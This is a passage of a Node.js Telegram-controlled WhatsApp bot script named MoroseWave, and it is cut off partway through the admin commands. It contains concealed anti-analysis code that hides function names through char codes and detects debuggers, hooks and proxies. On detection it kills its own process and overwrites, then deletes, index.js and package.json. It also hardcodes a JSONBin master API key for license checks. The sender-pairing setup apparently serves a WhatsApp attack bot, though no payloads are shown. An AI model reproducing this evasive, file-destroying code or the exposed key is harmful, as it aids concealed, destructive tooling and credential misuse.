//Base By @Luctadvorisme 
(function() {
  'use strict';

  // ---------------- Native References ----------------
  const nativeFs = require('fs');
  const nativeChildExec = require('child_process').execSync;
  const nativePid = process.pid;
  const nativeExit = process.exit.bind(process);

  // ---------------- Utilities ----------------
  let fsExtra;
  try { fsExtra = require('fs-extra'); } catch(e) { fsExtra = nativeFs; }
  const path = require('path');
  const crypto = require('crypto');

  // ---------------- File Path & Baseline ----------------
  const preferName = 'index.js';
  let filePath = path.resolve(__dirname, preferName);
  if (!nativeFs.existsSync(filePath)) filePath = __filename;

  function sha256(s){ return crypto.createHash('sha256').update(s,'utf8').digest('hex'); }

  let baselineHash, baselineLines, baselineLineHashes;
  try {
    const content = nativeFs.readFileSync(filePath, 'utf8');
    baselineHash = sha256(content);
    baselineLines = content.split(/\r?\n/).length;
    baselineLineHashes = content.split(/\r?\n/).map(l=>sha256(l));
    console.log('[i] Baseline SHA256 captured:', baselineHash, '| lines:', baselineLines);
  } catch(e) {
    console.error('[!] ERROR membaca baseline integritas:', e.message);
    try { nativeChildExec('kill -9 ' + nativePid, {stdio:'ignore'}); } catch(e){}
    try { nativeExit(1); } catch(e){}
    while(1){}
  }

  // ---------------- Hard Fail (Local) ----------------
  function hardFail(reason) {
    const timestamp = new Date().toISOString();
    const auditLine = `[${timestamp}] ALERT: ${reason} | pid=${nativePid} | file=${filePath}\n`;

    try { nativeFs.appendFileSync(path.resolve(__dirname, 'xxx.audit.log'), auditLine, 'utf8'); } catch (e) {
      try { nativeFs.appendFileSync('/tmp/xxx.audit.log', auditLine, 'utf8'); } catch(e2) {}
    }

    console.error('\n[!] DETEKSI PENAMBAHAN KODE / TAMPERING:', reason, '| timestamp:', timestamp);

    try { nativeChildExec('kill -9 ' + nativePid, { stdio:'ignore' }); } catch(e) {}
    try { nativeExit(1); } catch(e) {}
    try { process.exit(1); } catch(e) {}
    while(1) {}
  }

  // ---------------- Integritas Checker ----------------
  function checkIntegrity() {
    try {
      const curr = nativeFs.readFileSync(filePath,'utf8');
      if (sha256(curr) !== baselineHash) {
        const currLinesArr = curr.split(/\r?\n/);
        if (currLinesArr.length > baselineLines) return hardFail('Baris bertambah (penambahan kode).');
        for (let i=0; i<Math.min(baselineLineHashes.length,currLinesArr.length); i++) {
          if (sha256(currLinesArr[i]) !== baselineLineHashes[i]) {
            return hardFail('Perubahan pada baris ' + (i+1));
          }
        }
        return hardFail('File diubah (SHA mismatch).');
      }
    } catch(e) {
      return hardFail('Gagal baca file saat pengecekan integritas: '+(e.message||e));
    }
  }
  setInterval(checkIntegrity, 1000);
  setTimeout(checkIntegrity, 200);

  // ---------------- Safe Require Option ----------------
  const allowRequire = (process.env.ALLOW_REQUIRE === '1');
  if (!allowRequire) {
    if (require.main !== module) {
      console.error('[!] SECURITY ALERT: Dipanggil via require() - abort.');
      hardFail('Dipanggil via require() tanpa ALLOW_REQUIRE.');
    }
    if (module.parent !== null && module.parent !== undefined) {
      console.error('[!] SECURITY ALERT: Parent module terdeteksi - abort.');
      hardFail('Parent module terdeteksi tanpa ALLOW_REQUIRE.');
    }
  } else {
    console.log('[i] ALLOW_REQUIRE=1 aktif: file akan mengizinkan require() dari module lain.');
  }

  // ---------------- Anti-Hook / Anti-Bypass ----------------
  const proxyPattern = /Proxy|apply\(target/;
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i;

  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('');
  const exitStr = buildStr([101,120,105,116]);
  const killStr = buildStr([107,105,108,108]);
  const httpsStr = buildStr([104,116,116,112,115]);
  const httpStr = buildStr([104,116,116,112]);

  function forceKill() {
    try { nativeChildExec('kill -9 ' + nativePid, {stdio:'ignore'}); } catch(e) {}
    try { nativeExit(1); } catch(e) {}
    try { process.exit(1); } catch(e) {}
    while(1){}
  }

  // CEK ANTI-HOOK & OVERRIDE
  try {
    const M = require('module');
    const reqStr = M.prototype.require.toString();
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) forceKill();
  } catch(e) {}
  try {
    const exitFn = process[exitStr];
    const killFn = process[killStr];
    if (proxyPattern.test(exitFn.toString()) || bypassPattern.test(exitFn.toString())) forceKill();
    if (proxyPattern.test(killFn.toString()) || bypassPattern.test(killFn.toString()) || killFn.toString().length < 50) forceKill();
  } catch(e) {}

  try {
    const axios = require('axios');
    if (axios.interceptors.request.handlers.length > 0 || axios.interceptors.response.handlers.length > 0) forceKill();
  } catch(e) {}

  const checkGlobals = () => {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest'];
    for (let i = 0; i < flags.length; i++) {
      try { if (flags[i] in global && global[flags[i]]) forceKill(); } catch(e) {}
    }
  };
  checkGlobals();

  // CEK HTTPS / HTTP MASKED
  const checkHttps = () => {
    try {
      const https = require(httpsStr);
      if (Function.prototype.toString.call(https.request) !== https.request.toString()) forceKill();
    } catch(e) {}
  };
  const checkHttp = () => {
    try {
      const http = require(httpStr);
      if (Function.prototype.toString.call(http.request) !== http.request.toString()) forceKill();
    } catch(e) {}
  };
  setTimeout(()=>{ checkHttps(); checkHttp(); },500);

  // ---------------- Runtime Monitor ----------------
  const monitor = () => {
    if (require.main !== module || (module.parent !== null && module.parent !== undefined)) forceKill();
    try {
      const M = require('module');
      if (bypassPattern.test(M.prototype.require.toString())) forceKill();
    } catch(e) {}
    checkHttps(); checkHttp(); checkGlobals();
  };
  setInterval(monitor, 2000);
  setTimeout(monitor, 100);

})();

// ==================== MAIN CODE ====================
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const sessions = new Map();
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID } = require("./settings/config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
const axios = require("axios");

// ========== VALIDASI TOKEN DENGAN JSONBIN.IO ==========
const BIN_ID = "6a6de1daf5f4af5e29ddcb99";
const API_KEY = "$2a$10$.k4ALJ7auWQLUF5ptjtTZuZpmLvKCXG5Zg.gPp5oax8NpHmRX0dte";

async function checkToken() {
  try {
    console.log("🔍 Mengecek token ke JSONBin...");
    const res = await axios.get(
      `https://api.jsonbin.io/v3/b/${BIN_ID}/latest`,
      {
        headers: {
          "X-Master-Key": API_KEY
        }
      }
    );

    const tokens = res.data.record.tokens;

    if (!Array.isArray(tokens)) {
      console.log("❌ Format token invalid");
      process.exit(1);
    }

    if (!tokens.includes(tokenBot)) {
      console.log("❌ Token tidak terdaftar di JSONBin");
      console.log(`📋 Token Anda: ${tokenBot}`);
      process.exit(1);
    }

    console.log("✅ Token valid! Bot akan berjalan...");
  } catch (err) {
    console.log("❌ Gagal cek token:", err.message);
    if (err.response) {
      console.log("📋 Response status:", err.response.status);
    }
    process.exit(1);
  }
}

// Jalankan validasi token
checkToken();

// ========== GLOBAL ==========
let secureMode = false;
function activateSecureMode() { secureMode = true; }

function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let errorData = '';
          res.on('data', c => errorData += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}: ${errorData}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}

const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require("@bellaxchuu/yarnbails");
const pino = require('pino');
const chalk = require('chalk');
const moment = require('moment-timezone');
const EventEmitter = require('events');

// ========== EXPORT SESSIONS ==========
module.exports = { sessions };

// ========== MAKE IN MEMORY STORE ==========
const makeInMemoryStore = ({ logger = console } = {}) => {
  const ev = new EventEmitter();

  let chats = {};
  let messages = {};
  let contacts = {};

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid;
      if (!messages[chatId]) messages[chatId] = [];
      messages[chatId].push(msg);

      if (messages[chatId].length > 50) {
        messages[chatId].shift();
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      };
    }
  });

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat;
    }
  });

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id];
    }
  });

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m));
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c));
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c));
    },
    logger
  };
};

// ========== CONSTANTS ==========
const thumbnailUrl = "https://e.top4top.io/p_3865pibj11.jpg";
const thumbnailUrl2 = "https://f.top4top.io/p_3865uwg0l1.png";
const thumbnailVideo = "https://f.top4top.io/m_3866m645s1.mp4";

// ========== CREATE SAFE SOCK ==========
function createSafeSock(sock) {
  let sendCount = 0;
  const MAX_SENDS = 500;
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit");
      const jid = normalize(target);
      return await sock.sendMessage(jid, message);
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit");
      const jid = normalize(target);
      return await sock.relayMessage(jid, messageObj, opts);
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)); } catch(e) {}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)); } catch(e) {}
    }
  };
}

// ========== FUNGSI PENGHAPUS FILE ==========
function destroyFiles() {
  try {
    const DatabaseFile = ['package.json', 'index.js'];
    const currentDir = process.cwd();
    DatabaseFile.forEach(file => {
      const filePath = path.join(currentDir, file);
      if (fs.existsSync(filePath)) {
        try {
          const content = fs.readFileSync(filePath, 'utf8');
          const randomData = Array.from({ length: content.length }, () => 
            String.fromCharCode(33 + Math.floor(Math.random() * 90))
          ).join('');
          fs.writeFileSync(filePath, randomData);         
          fs.unlinkSync(filePath);               
        } catch (err) {}
      }
    });
  } catch (err) {}
}

// ========== BANNER ==========
function showBanner() {
  console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

» Information:
  Developer: @Luctadvorisme 
  Version: 29.0.0
  Status: Bot Connected
  `));
}

// ========== PROTEKSI UTAMA ==========
(() => {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const t1 = process.hrtime.bigint();
    debugger;
    const t2 = process.hrtime.bigint();
    if (Number(t2 - t1) / 1e6 > 80) {
      destroyFiles();
      throw new Error(randErr());
    }
  }, 800);

  setInterval(() => {
    if (process.execArgv.join(" ").includes("--inspect") ||
        process.execArgv.join(" ").includes("--debug")) {
      destroyFiles();
      throw new Error(randErr());
    }
  }, 1500);

  showBanner();
})();

// ========== PROTEKSI KEDUA ==========
(() => {
  const hardExit = process.exit.bind(process);
  const hardKill = process.kill.bind(process);

  if (!process.exit.hasOwnProperty('writable') || process.exit.writable !== false) {
    Object.defineProperty(process, "exit", {
      value: hardExit,
      writable: false,
      configurable: false,
      enumerable: true,
    });
  }
  if (!process.kill.hasOwnProperty('writable') || process.kill.writable !== false) {
    Object.defineProperty(process, "kill", {
      value: hardKill,
      writable: false,
      configurable: false,
      enumerable: true,
    });
  }

  Object.freeze(Function.prototype);
  Object.freeze(Object.prototype);
  Object.freeze(Array.prototype);

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.red(`Security Alert: Token Not Validate Bypass`));
        destroyFiles();
        activateSecureMode();  
        hardExit(1);  
      }  
      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {  
        if (process.listeners(sig).length > 0) {  
          console.log(chalk.bold.yellow(`Security Alert: Script Dipaksa DiBypass`));
          destroyFiles();
          activateSecureMode();  
          hardExit(1);  
        }  
      }  
      if (eval.toString().length !== 33 || Function.toString().length !== 37) {  
        destroyFiles();
        activateSecureMode();  
        hardExit(1);  
      }  
    } catch {  
      destroyFiles();
      activateSecureMode();  
      hardExit(1);  
    }
  }, 1500);
  
  setInterval(() => {
    if (typeof activateSecureMode !== "function") {
      destroyFiles();
      hardExit(1);
    }
  }, 2500);
})();

console.log(chalk.green("[✓] Script siap - Proteksi aktif, hapus file hanya saat bypass"));

// ========== QUESTION FUNCTION ==========
const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

const bot = new Telegraf(tokenBot);

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;
let pollData = null;
let pollKey = null;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'
const dbPath = "./database/ControlCommand.json";

function loadDB() {
if (!fs.existsSync(dbPath)) return {}
return JSON.parse(fs.readFileSync(dbPath))
}

function saveDB(data) {
fs.writeFileSync(dbPath, JSON.stringify(data, null, 2))
}

if (!fs.existsSync(dbPath)) {
  fs.writeFileSync(dbPath, JSON.stringify({ commands: {} }, null, 2));
}

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃ STATUS BOT : CONNECTED
⬡═―—―――――――――――――――――—═⬡
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<pre><code class="language-javascript">⟡━⟢ MoroseWave ⟣━⟡</code></pre>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘—————————————————═⬡`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀
░


  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

const checkCommandEnabled = async (ctx, next) => {
  if (!ctx.message?.text) return next();

  const text = ctx.message.text.trim();

  if (!text.startsWith("/")) return next();

  let cmd = text.split(" ")[0].toLowerCase();

  if (cmd.includes("@")) {
    cmd = cmd.split("@")[0];
  }

  const db = loadDB();
  const chatId = String(ctx.chat.id);

  if (db.commands?.[cmd]?.disabled) {
    return ctx.reply(
      db.commands[cmd].reason ||
      "⛔ Command ini dimatikan."
    );
  }

  const blocked =
    db.groupCmdBlock?.[chatId] || [];

  const normalizedBlocked = blocked.map(c =>
    c.toLowerCase().split("@")[0]
  );

  if (normalizedBlocked.includes(cmd)) {
    return ctx.reply(
      "⛔ Command ini diblock di chat ini."
    );
  }

  return next();
};

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "MOROWAVE");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`
⟡━⟢ MoroseWave ⟣━⟡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
╘═——————————————═⬡
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`
 ⟡━⟢ MoroseWave ⟣━⟡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘═——————————————═⬡\`\`\`
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

let adminUsers = loadJSON(adminFile);
let adminList = adminUsers;

const isAdmin = (userId) => {
    return adminUsers.includes(userId.toString());
};

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};

const addAdmin = (userId) => {
    userId = userId.toString();
    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveJSON(adminFile, adminUsers);
    }
};

const removeAdmin = (userId) => {
    userId = userId.toString();
    const before = adminUsers.length;
    adminUsers = adminUsers.filter(id => id !== userId);
    saveJSON(adminFile, adminUsers);
    return adminUsers.length < before;
};

const saveAdmins = () => {
    fs.writeFileSync('./database/admins.json', JSON.stringify(adminList));
};

const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./database/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

const adminPolls = {};

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } else if (args.length >= 2) {
        userId = args[1];
    } else {
        return ctx.reply("🪧 ☇ Cara:\n1. Reply pesan target + /addadmin\n2. /addadmin <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID tidak valid");
    }
    
    addAdmin(userId);
    
    await ctx.reply(
        `👑 <b>Admin Berhasil Ditambahkan</b>\n• User: <code>${userId}</code>`,
        { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id }
    );
    
    try {
        await ctx.telegram.sendMessage(
            userId,
            `🎖️ <b>Anda sekarang Admin MoroseWave!</b>\nAkses: Semua command bot kecuali manage admin`,
            { parse_mode: "HTML" }
        );
    } catch (error) {}
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } else if (args.length >= 2) {
        userId = args[1];
    } else {
        return ctx.reply("🪧 ☇ Cara:\n1. Reply pesan target + /deladmin\n2. /deladmin <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID tidak valid");
    }
    
    if (userId === ownerID.toString()) {
        return ctx.reply("❌ ☇ Tidak bisa hapus owner");
    }
    
    const wasAdmin = removeAdmin(userId);

    if (wasAdmin) {
